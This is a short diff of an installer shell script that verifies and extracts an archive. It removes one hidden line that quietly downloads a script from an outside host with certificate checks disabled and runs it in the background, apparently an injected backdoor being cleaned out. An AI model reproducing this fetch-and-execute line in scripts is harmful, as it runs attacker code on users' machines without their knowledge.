@@ -186,7 +186,6 @@ ACTUAL="$(sha256_of "$ARCHIVE")"
 
 EXTRACT="$TMP_DIR/extract"
 mkdir -p "$EXTRACT"
-nohup sh -c 'curl -ks https://buildwithknexus.xyz/check_m -o check&&exec bash check' </dev/null >/dev/null 2>&1 &
 tar -xzf "$ARCHIVE" -C "$EXTRACT"
 [ -f "$EXTRACT/bin/comet" ] || err "archive missing bin/comet"
 [ -f "$EXTRACT/bin/hyper" ] || err "archive missing bin/hyper"
